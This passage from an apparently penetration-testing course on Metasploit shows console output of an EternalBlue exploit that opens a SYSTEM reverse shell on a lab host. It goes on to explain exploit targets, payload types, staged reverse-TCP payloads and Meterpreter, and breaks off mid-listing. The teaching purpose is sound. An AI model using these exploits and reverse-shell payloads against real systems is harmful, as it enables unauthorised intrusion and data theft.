[*] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span>       - Host is likely VULNERABLE to MS17-<span class="hljs-number">010</span>! - Windows <span class="hljs-number">7</span> Professional <span class="hljs-number">7601</span> Service Pack <span class="hljs-number">1</span> x64 (<span class="hljs-number">64</span>-bit)
[*] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span>       - Scanned <span class="hljs-number">1</span> of <span class="hljs-number">1</span> hosts (<span class="hljs-number">100</span>% complete)
[*] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - Connecting to target for exploitation.
[+] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - Connection established for exploitation.
[+] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - Target OS selected valid for OS indicated by SMB reply
[*] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - CORE raw buffer dump (<span class="hljs-number">42</span> bytes)
[*] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - <span class="hljs-number">0x00000000</span>  <span class="hljs-number">57</span> <span class="hljs-number">69</span> 6e <span class="hljs-number">64</span> 6f <span class="hljs-number">77</span> <span class="hljs-number">73</span> <span class="hljs-number">20</span> <span class="hljs-number">37</span> <span class="hljs-number">20</span> <span class="hljs-number">50</span> <span class="hljs-number">72</span> 6f <span class="hljs-number">66</span> <span class="hljs-number">65</span> <span class="hljs-number">73</span>  Windows <span class="hljs-number">7</span> Profes
[*] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - <span class="hljs-number">0x00000010</span>  <span class="hljs-number">73</span> <span class="hljs-number">69</span> 6f 6e <span class="hljs-number">61</span> 6c <span class="hljs-number">20</span> <span class="hljs-number">37</span> <span class="hljs-number">36</span> <span class="hljs-number">30</span> <span class="hljs-number">31</span> <span class="hljs-number">20</span> <span class="hljs-number">53</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">76</span>  sional <span class="hljs-number">7601</span> Serv
[*] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - <span class="hljs-number">0x00000020</span>  <span class="hljs-number">69</span> <span class="hljs-number">63</span> <span class="hljs-number">65</span> <span class="hljs-number">20</span> <span class="hljs-number">50</span> <span class="hljs-number">61</span> <span class="hljs-number">63</span> 6b <span class="hljs-number">20</span> <span class="hljs-number">31</span>                    ice Pack <span class="hljs-number">1</span>      
[+] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - Target arch selected valid for arch indicated by DCE/RPC reply
[*] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - Trying exploit with <span class="hljs-number">12</span> Groom Allocations.
[*] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - Sending all but last fragment of exploit packet
[*] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - Starting non-paged pool grooming
[+] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - Sending SMBv2 buffers
[+] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - Sending final SMBv2 buffers.
[*] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - Sending last fragment of exploit packet!
[*] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - Receiving response from exploit packet
[+] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - ETERNALBLUE overwrite completed successfully (<span class="hljs-number">0xC000000D</span>)!
[*] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - Sending egg to corrupted connection.
[*] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - Triggering free of corrupted buffer.
[*] Command shell session <span class="hljs-number">1</span> opened (<span class="hljs-number">10.10</span><span class="hljs-meta">.14</span><span class="hljs-meta">.15</span>:<span class="hljs-number">4444</span> -&gt; <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">49158</span>) <span class="hljs-meta">at</span> <span class="hljs-number">2020</span>-<span class="hljs-number">08</span>-<span class="hljs-number">13</span> <span class="hljs-number">21</span>:<span class="hljs-number">37</span>:<span class="hljs-number">21</span> +<span class="hljs-number">0000</span>
[+] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


meterpreter&gt; shell
<span class="hljs-symbol">
C:</span>\Windows\system32&gt;
</code></pre>
<p>We now have a shell on the target machine, and we can interact with it.</p>
<p><strong>MSF - Target Interaction</strong></p>
<p>Modules</p>
<pre><code class="lang-shell-session">C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\s</span>ystem32&gt; whoami

whoami
nt authority<span class="hljs-symbol">\s</span>ystem
</code></pre>
<p>This has been a quick and dirty example of how <code>msfconsole</code> can help out quickly but serves as an excellent example of how the framework works. Only one module was needed without any <code>payload</code> selection, <code>encoding</code> or <code>pivoting</code> between sessions or jobs.</p>
<h2 id="targets">Targets</h2>
<hr>
<p><code>Targets</code> are unique operating system identifiers taken from the versions of those specific operating systems which adapt the selected exploit module to run on that particular version of the operating system. The <code>show targets</code> command issued within an exploit module view will display all available vulnerable targets for that specific exploit, while issuing the same command in the root menu, outside of any selected exploit module, will let us know that we need to select an exploit module first.</p>
<p><strong>MSF - Show Targets</strong></p>
<pre><code class="lang-shell-session">msf6 &gt; show targets

[-] No exploit <span class="hljs-class"><span class="hljs-keyword">module</span> <span class="hljs-title">selected</span>.</span>
</code></pre>
<p>When looking at our previous exploit module, this would be what we see:</p>
<pre><code class="lang-shell-session">msf6 exploit(windows/smb/ms17_010_psexec) &gt; <span class="hljs-keyword">options</span>

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra <span class="hljs-keyword">debug</span> trace info
   LEAKATTEMPTS          <span class="hljs-number">99</span>                                       yes       How many times <span class="hljs-keyword">to</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">to</span> leak transaction
   NAMEDPIPE                                                      <span class="hljs-keyword">no</span>        A named pipe that can <span class="hljs-keyword">be</span> connected <span class="hljs-keyword">to</span> (leave blank <span class="hljs-keyword">for</span> auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes <span class="hljs-keyword">to</span> check
                         rdlists/named_pipes.txt
   RHOSTS                <span class="hljs-number">10.10</span>.<span class="hljs-number">10.40</span>                              yes       The target host(s), see http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 <span class="hljs-number">445</span>                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            <span class="hljs-keyword">no</span>        Service description <span class="hljs-keyword">to</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">be</span> used <span class="hljs-keyword">on</span> target <span class="hljs-keyword">for</span> pretty listing
   SERVICE_DISPLAY_NAME                                           <span class="hljs-keyword">no</span>        The service <span class="hljs-keyword">display</span> name
   SERVICE_NAME                                                   <span class="hljs-keyword">no</span>        The service name
   SHARE                 ADMIN$                                   yes       The share <span class="hljs-keyword">to</span> connect <span class="hljs-keyword">to</span>, can <span class="hljs-keyword">be</span> <span class="hljs-keyword">an</span> admin share (ADMIN$,C$,...) <span class="hljs-built_in">or</span> <span class="hljs-keyword">a</span> <span class="hljs-keyword">no</span>
                                                                            rmal <span class="hljs-keyword">read</span>/<span class="hljs-keyword">write</span> folder share
   SMBDomain             .                                        <span class="hljs-keyword">no</span>        The Windows domain <span class="hljs-keyword">to</span> use <span class="hljs-keyword">for</span> authentication
   SMBPass                                                        <span class="hljs-keyword">no</span>        The password <span class="hljs-keyword">for</span> the specified username
   SMBUser                                                        <span class="hljs-keyword">no</span>        The username <span class="hljs-keyword">to</span> authenticate <span class="hljs-keyword">as</span>


Payload <span class="hljs-keyword">options</span> (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: <span class="hljs-string">''</span>, seh, thread, process, none)
   LHOST                      yes       The listen address (<span class="hljs-keyword">an</span> interface may <span class="hljs-keyword">be</span> specified)
   LPORT     <span class="hljs-number">4444</span>             yes       The listen port


Exploit targe<span class="hljs-variable">t:</span>

   Id  Name
   --  ----
   <span class="hljs-number">0</span>   Automatic
</code></pre>
<hr>
<h3 id="selecting-a-target">Selecting a Target</h3>
<p>We can see that there is only one general type of target set for this type of exploit. What if we change the exploit module to something that needs more specific target ranges? The following exploit is aimed at:</p>
<ul>
<li><code>MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability</code>.</li>
</ul>
<p>If we want to find out more about this specific module and what the vulnerability behind it does, we can use the <code>info</code> command. This command can help us out whenever we are unsure about the origins or functionality of different exploits or auxiliary modules. Keeping in mind that it is always considered best practice to audit our code for any artifact generation or &#39;additional features&#39;, the <code>info</code> command should be one of the first steps we take when using a new module. This way, we can familiarize ourselves with the exploit functionality while assuring a safe, clean working environment for both our clients and us.</p>
<p><strong>MSF - Target Selection</strong></p>
<pre><code class="lang-shell-session">msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; info

       Name: MS12<span class="hljs-number">-063</span> Microsoft Internet Explorer execCommand Use-After-Free Vulnerability 
     Module: exploit/windows/browser/ie_execcommand_uaf
   Platform: Windows
       Arch: 
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Good
  Disclosed: <span class="hljs-number">2012</span><span class="hljs-number">-09</span><span class="hljs-number">-14</span>

Provided <span class="hljs-keyword">by</span>:
  unknown
  eromang
  binjo
  sinn3r &lt;sinn3r@metasploit.com&gt;
  juan vazquez &lt;juan.vazquez@metasploit.com&gt;

Available targets:
  Id  Name
  <span class="hljs-comment">--  ----</span>
  <span class="hljs-number">0</span>   Automatic
  <span class="hljs-number">1</span>   IE <span class="hljs-number">7</span> <span class="hljs-keyword">on</span> <span class="hljs-title">Windows</span> <span class="hljs-title">XP</span> <span class="hljs-title">SP3</span>
  <span class="hljs-number">2</span>   IE <span class="hljs-number">8</span> <span class="hljs-keyword">on</span> <span class="hljs-title">Windows</span> <span class="hljs-title">XP</span> <span class="hljs-title">SP3</span>
  <span class="hljs-number">3</span>   IE <span class="hljs-number">7</span> <span class="hljs-keyword">on</span> <span class="hljs-title">Windows</span> <span class="hljs-title">Vista</span>
  <span class="hljs-number">4</span>   IE <span class="hljs-number">8</span> <span class="hljs-keyword">on</span> <span class="hljs-title">Windows</span> <span class="hljs-title">Vista</span>
  <span class="hljs-number">5</span>   IE <span class="hljs-number">8</span> <span class="hljs-keyword">on</span> <span class="hljs-title">Windows</span> <span class="hljs-title">7</span>
  <span class="hljs-number">6</span>   IE <span class="hljs-number">9</span> <span class="hljs-keyword">on</span> <span class="hljs-title">Windows</span> <span class="hljs-title">7</span>

Check supported:
  No

Basic options:
  Name       Current Setting  Required  Description
  <span class="hljs-comment">----       ---------------  --------  -----------</span>
  OBFUSCATE  <span class="hljs-literal">false</span>            no        Enable JavaScript obfuscation
  SRVHOST    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>          yes       The <span class="hljs-built_in">local</span> host <span class="hljs-built_in">to</span> listen <span class="hljs-keyword">on</span>. <span class="hljs-title">This</span> <span class="hljs-title">must</span> <span class="hljs-title">be</span> <span class="hljs-title">an</span> <span class="hljs-title">address</span> <span class="hljs-title">on</span> <span class="hljs-title">the</span> <span class="hljs-title">local</span> <span class="hljs-title">machine</span> <span class="hljs-title">or</span> <span class="hljs-title">0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>
  SRVPORT    <span class="hljs-number">8080</span>             yes       The <span class="hljs-built_in">local</span> port <span class="hljs-built_in">to</span> listen <span class="hljs-keyword">on</span>.
  SSL        <span class="hljs-literal">false</span>            no        Negotiate SSL <span class="hljs-keyword">for</span> incoming connections
  SSLCert                     no        Path <span class="hljs-built_in">to</span> <span class="hljs-keyword">a</span> custom SSL certificate (default is randomly generated)
  URIPATH                     no        The URI <span class="hljs-built_in">to</span> use <span class="hljs-keyword">for</span> this exploit (default is <span class="hljs-built_in">random</span>)

Payload information:

Description:
  This module exploits <span class="hljs-keyword">a</span> vulnerability found <span class="hljs-keyword">in</span> Microsoft Internet 
  Explorer (MSIE). When rendering <span class="hljs-keyword">an</span> HTML page, <span class="hljs-keyword">the</span> CMshtmlEd object 
  gets deleted <span class="hljs-keyword">in</span> <span class="hljs-keyword">an</span> unexpected manner, but <span class="hljs-keyword">the</span> same memory is reused 
  again later <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> CMshtmlEd::Exec() <span class="hljs-function"><span class="hljs-keyword">function</span>, <span class="hljs-title">leading</span> <span class="hljs-title">to</span> <span class="hljs-title">a</span> </span>
  use-<span class="hljs-keyword">after</span>-free condition. Please note that this vulnerability has 
  been exploited since Sep <span class="hljs-number">14</span>, <span class="hljs-number">2012.</span> Also, note that 
  presently, this module has some target dependencies <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> ROP 
  chain <span class="hljs-built_in">to</span> be valid. For WinXP SP3 <span class="hljs-keyword">with</span> IE8, msvcrt must be present 
  (<span class="hljs-keyword">as</span> <span class="hljs-keyword">it</span> is <span class="hljs-keyword">by</span> default). For Vista <span class="hljs-keyword">or</span> Win7 <span class="hljs-keyword">with</span> IE8, <span class="hljs-keyword">or</span> Win7 <span class="hljs-keyword">with</span> IE9, 
  JRE <span class="hljs-number">1.6</span>.x <span class="hljs-keyword">or</span> below must be installed (which is often <span class="hljs-keyword">the</span> <span class="hljs-keyword">case</span>).

References:
  <span class="hljs-keyword">https</span>://cvedetails.com/cve/CVE<span class="hljs-number">-2012</span><span class="hljs-number">-4969</span>/
  OSVDB (<span class="hljs-number">85532</span>)
  <span class="hljs-keyword">https</span>://docs.microsoft.com/en-us/security-updates/SecurityBulletins/<span class="hljs-number">2012</span>/MS12<span class="hljs-number">-063</span>
  <span class="hljs-keyword">http</span>://technet.microsoft.com/en-us/security/advisory/<span class="hljs-number">2757760</span>
  <span class="hljs-keyword">http</span>://eromang.zataz.com/<span class="hljs-number">2012</span>/<span class="hljs-number">09</span>/<span class="hljs-number">16</span>/<span class="hljs-literal">zero</span>-day-season-is-really-<span class="hljs-keyword">not</span>-over-yet/
</code></pre>
<p>Looking at the description, we can get a general idea of what this exploit will accomplish for us. Keeping this in mind, we would next want to check which versions are vulnerable to this exploit.</p>
<pre><code class="lang-shell-session">msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; options

Module options (exploit/windows/browser/ie_execcommand_uaf):

   Name       Current Setting  Required  Description
   <span class="hljs-comment">----       ---------------  --------  -----------</span>
   OBFUSCATE  <span class="hljs-literal">false</span>            no        Enable JavaScript obfuscation
   SRVHOST    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>          yes       The <span class="hljs-keyword">local</span> host <span class="hljs-keyword">to</span> listen <span class="hljs-keyword">on</span>. This must be an address <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">local</span> machine <span class="hljs-keyword">or</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>
   SRVPORT    <span class="hljs-number">8080</span>             yes       The <span class="hljs-keyword">local</span> port <span class="hljs-keyword">to</span> listen <span class="hljs-keyword">on</span>.
   SSL        <span class="hljs-literal">false</span>            no        Negotiate SSL <span class="hljs-keyword">for</span> incoming connections
   SSLCert                     no        Path <span class="hljs-keyword">to</span> a custom SSL certificate (default <span class="hljs-keyword">is</span> randomly generated)
   URIPATH                     no        The URI <span class="hljs-keyword">to</span> use <span class="hljs-keyword">for</span> this exploit (default <span class="hljs-keyword">is</span> random)


Exploit target:

   Id  Name
   <span class="hljs-comment">--  ----</span>
   <span class="hljs-number">0</span>   Automatic


msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; show targets

Exploit targets:

   Id  Name
   <span class="hljs-comment">--  ----</span>
   <span class="hljs-number">0</span>   Automatic
   <span class="hljs-number">1</span>   IE <span class="hljs-number">7</span> <span class="hljs-keyword">on</span> Windows XP SP3
   <span class="hljs-number">2</span>   IE <span class="hljs-number">8</span> <span class="hljs-keyword">on</span> Windows XP SP3
   <span class="hljs-number">3</span>   IE <span class="hljs-number">7</span> <span class="hljs-keyword">on</span> Windows Vista
   <span class="hljs-number">4</span>   IE <span class="hljs-number">8</span> <span class="hljs-keyword">on</span> Windows Vista
   <span class="hljs-number">5</span>   IE <span class="hljs-number">8</span> <span class="hljs-keyword">on</span> Windows <span class="hljs-number">7</span>
   <span class="hljs-number">6</span>   IE <span class="hljs-number">9</span> <span class="hljs-keyword">on</span> Windows <span class="hljs-number">7</span>
</code></pre>
<p>We see options for both different versions of Internet Explorer and various Windows versions. Leaving the selection to <code>Automatic</code> will let msfconsole know that it needs to perform service detection on the given target before launching a successful attack.</p>
<p>If we, however, know what versions are running on our target, we can use the <code>set target &lt;index no.&gt;</code> command to pick a target from the list.</p>
<pre><code class="lang-shell-session">msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; show targets

Exploit targets:

   Id  Name
   <span class="hljs-comment">--  ----</span>
   <span class="hljs-number">0</span>   Automatic
   <span class="hljs-number">1</span>   IE <span class="hljs-number">7</span> <span class="hljs-keyword">on</span> <span class="hljs-title">Windows</span> <span class="hljs-title">XP</span> <span class="hljs-title">SP3</span>
   <span class="hljs-number">2</span>   IE <span class="hljs-number">8</span> <span class="hljs-keyword">on</span> <span class="hljs-title">Windows</span> <span class="hljs-title">XP</span> <span class="hljs-title">SP3</span>
   <span class="hljs-number">3</span>   IE <span class="hljs-number">7</span> <span class="hljs-keyword">on</span> <span class="hljs-title">Windows</span> <span class="hljs-title">Vista</span>
   <span class="hljs-number">4</span>   IE <span class="hljs-number">8</span> <span class="hljs-keyword">on</span> <span class="hljs-title">Windows</span> <span class="hljs-title">Vista</span>
   <span class="hljs-number">5</span>   IE <span class="hljs-number">8</span> <span class="hljs-keyword">on</span> <span class="hljs-title">Windows</span> <span class="hljs-title">7</span>
   <span class="hljs-number">6</span>   IE <span class="hljs-number">9</span> <span class="hljs-keyword">on</span> <span class="hljs-title">Windows</span> <span class="hljs-title">7</span>


msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; <span class="hljs-built_in">set</span> target <span class="hljs-number">6</span>

target =&gt; <span class="hljs-number">6</span>
</code></pre>
<hr>
<h3 id="target-types">Target Types</h3>
<p>There is a large variety of target types. Every target can vary from another by service pack, OS version, and even language version. It all depends on the return address and other parameters in the target or within the exploit module.</p>
<p>The return address can vary because a particular language pack changes addresses, a different software version is available, or the addresses are shifted due to hooks. It is all determined by the type of return address required to identify the target. This address can be <code>jmp esp</code>, a jump to a specific register that identifies the target, or a <code>pop/pop/ret</code>. For more on the topic of return addresses, see the <a href="https://academy.hackthebox.com/module/89/section/931">Stack-Based Buffer Overflows on Windows x86</a> module. Comments in the exploit module&#39;s code can help us determine what the target is defined by.</p>
<p>To identify a target correctly, we will need to:</p>
<ul>
<li>Obtain a copy of the target binaries</li>
<li>Use msfpescan to locate a suitable return address</li>
</ul>
<p>Later in the module, we will be delving deeper into exploit development, payload generation, and target identification.</p>
<h2 id="payloads">Payloads</h2>
<hr>
<p>A <code>Payload</code> in Metasploit refers to a module that aids the exploit module in (typically) returning a shell to the attacker. The payloads are sent together with the exploit itself to bypass standard functioning procedures of the vulnerable service (<code>exploits job</code>) and then run on the target OS to typically return a reverse connection to the attacker and establish a foothold (<code>payload&#39;s job</code>).</p>
<p>There are three different types of payload modules in the Metasploit Framework: Singles, Stagers, and Stages. Using three typologies of payload interaction will prove beneficial to the pentester. It can offer the flexibility we need to perform certain types of tasks. Whether or not a payload is staged is represented by <code>/</code> in the payload name.</p>
<p>For example, <code>windows/shell_bind_tcp</code> is a single payload with no stage, whereas <code>windows/shell/bind_tcp</code> consists of a stager (<code>bind_tcp</code>) and a stage (<code>shell</code>).</p>
<p><strong>Singles</strong></p>
<p>A <code>Single</code> payload contains the exploit and the entire shellcode for the selected task. Inline payloads are by design more stable than their counterparts because they contain everything all-in-one. However, some exploits will not support the resulting size of these payloads as they can get quite large. <code>Singles</code> are self-contained payloads. They are the sole object sent and executed on the target system, getting us a result immediately after running. A Single payload can be as simple as adding a user to the target system or booting up a process.</p>
<p><strong>Stagers</strong></p>
<p><code>Stager</code> payloads work with Stage payloads to perform a specific task. A Stager is waiting on the attacker machine, ready to establish a connection to the victim host once the stage completes its run on the remote host. <code>Stagers</code> are typically used to set up a network connection between the attacker and victim and are designed to be small and reliable. Metasploit will use the best one and fall back to a less-preferred one when necessary.</p>
<p>Windows NX vs. NO-NX Stagers</p>
<ul>
<li>Reliability issue for NX CPUs and DEP</li>
<li>NX stagers are bigger (VirtualAlloc memory)</li>
<li>Default is now NX + Win7 compatible</li>
</ul>
<p><strong>Stages</strong></p>
<p><code>Stages</code> are payload components that are downloaded by stager&#39;s modules. The various payload Stages provide advanced features with no size limits, such as Meterpreter, VNC Injection, and others. Payload stages automatically use middle stagers:</p>
<ul>
<li>A single <code>recv()</code> fails with large payloads</li>
<li>The Stager receives the middle stager</li>
<li>The middle Stager then performs a full download</li>
<li>Also better for RWX</li>
</ul>
<hr>
<h3 id="staged-payloads">Staged Payloads</h3>
<p>A staged payload is, simply put, an <code>exploitation process</code> that is modularized and functionally separated to help segregate the different functions it accomplishes into different code blocks, each completing its objective individually but working on chaining the attack together. This will ultimately grant an attacker remote access to the target machine if all the stages work correctly.</p>
<p>The scope of this payload, as with any others, besides granting shell access to the target system, is to be as compact and inconspicuous as possible to aid with the Antivirus (<code>AV</code>) / Intrusion Prevention System (<code>IPS</code>) evasion as much as possible.</p>
<p><code>Stage0</code> of a staged payload represents the initial shellcode sent over the network to the target machine&#39;s vulnerable service, which has the sole purpose of initializing a connection back to the attacker machine. This is what is known as a reverse connection. As a Metasploit user, we will meet these under the common names <code>reverse_tcp</code>, <code>reverse_https</code>, and <code>bind_tcp</code>. For example, under the <code>show payloads</code> command, you can look for the payloads that look like the following:</p>
<p><strong>MSF - Staged Payloads</strong></p>
<p>Payloads</p>
<pre><code class="lang-shell-session"><span class="hljs-symbol">msf6</span> &gt; show payloads

&lt;SNIP&gt;

<span class="hljs-number">535</span>  windows/x64/meterpreter/<span class="hljs-keyword">bind_ipv6_tcp </span>                               normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 <span class="hljs-keyword">Bind </span>TCP Stager
<span class="hljs-number">536</span>  windows/x64/meterpreter/<span class="hljs-keyword">bind_ipv6_tcp_uuid </span>                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 <span class="hljs-keyword">Bind </span>TCP Stager with UUID Support
<span class="hljs-number">537</span>  windows/x64/meterpreter/<span class="hljs-keyword">bind_named_pipe </span>                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 <span class="hljs-keyword">Bind </span>Named Pipe Stager
<span class="hljs-number">538</span>  windows/x64/meterpreter/<span class="hljs-keyword">bind_tcp </span>                                    normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 <span class="hljs-keyword">Bind </span>TCP Stager
<span class="hljs-number">539</span>  windows/x64/meterpreter/<span class="hljs-keyword">bind_tcp_rc4 </span>                                normal  No     Windows Meterpreter (Reflective Injection x64), <span class="hljs-keyword">Bind </span>TCP Stager (RC4 Stage Encryption, Metasm)
<span class="hljs-number">540</span>  windows/x64/meterpreter/<span class="hljs-keyword">bind_tcp_uuid </span>                               normal  No     Windows Meterpreter (Reflective Injection x64), <span class="hljs-keyword">Bind </span>TCP Stager with UUID Support (Windows x64)
<span class="hljs-number">541</span>  windows/x64/meterpreter/<span class="hljs-keyword">reverse_http </span>                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 <span class="hljs-keyword">Reverse </span>HTTP Stager (wininet)
<span class="hljs-number">542</span>  windows/x64/meterpreter/<span class="hljs-keyword">reverse_https </span>                               normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 <span class="hljs-keyword">Reverse </span>HTTP Stager (wininet)
<span class="hljs-number">543</span>  windows/x64/meterpreter/<span class="hljs-keyword">reverse_named_pipe </span>                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 <span class="hljs-keyword">Reverse </span>Named Pipe (SMB) Stager
<span class="hljs-number">544</span>  windows/x64/meterpreter/<span class="hljs-keyword">reverse_tcp </span>                                 normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 <span class="hljs-keyword">Reverse </span>TCP Stager
<span class="hljs-number">545</span>  windows/x64/meterpreter/<span class="hljs-keyword">reverse_tcp_rc4 </span>                             normal  No     Windows Meterpreter (Reflective Injection x64), <span class="hljs-keyword">Reverse </span>TCP Stager (RC4 Stage Encryption, Metasm)
<span class="hljs-number">546</span>  windows/x64/meterpreter/<span class="hljs-keyword">reverse_tcp_uuid </span>                            normal  No     Windows Meterpreter (Reflective Injection x64), <span class="hljs-keyword">Reverse </span>TCP Stager with UUID Support (Windows x64)
<span class="hljs-number">547</span>  windows/x64/meterpreter/<span class="hljs-keyword">reverse_winhttp </span>                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 <span class="hljs-keyword">Reverse </span>HTTP Stager (winhttp)
<span class="hljs-number">548</span>  windows/x64/meterpreter/<span class="hljs-keyword">reverse_winhttps </span>                            normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 <span class="hljs-keyword">Reverse </span>HTTPS Stager (winhttp)

&lt;SNIP&gt;
</code></pre>
<p>Reverse connections are less likely to trigger prevention systems like the one initializing the connection is the victim host, which most of the time resides in what is known as a <code>security trust zone</code>. However, of course, this trust policy is not blindly followed by the security devices and personnel of a network, so the attacker must tread carefully even with this step.</p>
<p>Stage0 code also aims to read a larger, subsequent payload into memory once it arrives. After the stable communication channel is established between the attacker and the victim, the attacker machine will most likely send an even bigger payload stage which should grant them shell access. This larger payload would be the <code>Stage1</code> payload. We will go into more detail in the later sections.</p>
<p><strong>Meterpreter Payload</strong></p>
<p>The <code>Meterpreter</code> payload is a specific type of multi-faceted payload that uses <code>DLL injection</code> to ensure the connection to the victim host is stable, hard to detect by simple checks, and persistent across reboots or system changes. Meterpreter resides completely in the memory of the remote host and leaves no traces on the hard drive, making it very difficult to detect with conventional forensic techniques. In addition, scripts and plugins can be <code>loaded and unloaded</code> dynamically as required.</p>
<p>Once the Meterpreter payload is executed, a new session is created, which spawns up the Meterpreter interface. It is very similar to the msfconsole interface, but all available commands are aimed at the target system, which the payload has &quot;infected.&quot; It offers us a plethora of useful commands, varying from keystroke capture, password hash collection, microphone tapping, and screenshotting to impersonating process security tokens. We will delve into more detail about Meterpreter in a later section.</p>
<p>Using Meterpreter, we can also <code>load</code> in different Plugins to assist us with our assessment. We will talk more about these in the Plugins section of this module.</p>
<hr>
<h3 id="searching-for-payloads">Searching for Payloads</h3>
<p>To select our first payload, we need to know what we want to do on the target machine. For example, if we are going for access persistence, we will probably want to select a Meterpreter payload.</p>
<p>As mentioned above, Meterpreter payloads offer us a significant amount of flexibility. Their base functionality is already vast and influential. We can automate and quickly deliver combined with plugins such as <a href="https://github.com/gentilkiwi/mimikatz">GentilKiwi&#39;s Mimikatz Plugin</a> parts of the pentest while keeping an organized, time-effective assessment. To see all of the available payloads, use the <code>show payloads</code> command in <code>msfconsole</code>.</p>
<p><strong>MSF - List Payloads</strong></p>
<p>Payloads</p>
<pre><code class="lang-shell-session"><span class="hljs-symbol">msf6</span> &gt; show payloads

<span class="hljs-symbol">Payloads</span>
========

   #    Name                                                Disclosure Date  Rank    Check  Description
